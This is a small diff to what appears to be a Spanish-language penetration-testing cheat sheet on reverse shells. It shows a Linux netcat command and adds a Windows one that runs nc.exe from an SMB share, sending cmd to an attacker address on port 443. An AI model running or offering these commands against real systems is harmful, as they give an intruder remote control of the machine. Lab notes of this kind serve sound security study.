@@ -23,3 +23,11 @@ Si la máquina linux tiene **netcap**.
 ```
 nc -e /bin/bash 10.10.14.31 443
 ```
+
+## Windows
+
+#### Ejecutar reverse shell desde recurso compartido
+
+```
+\\10.10.14.54\smbFolder\nc.exe -e cmd 10.10.14.54 443
+```
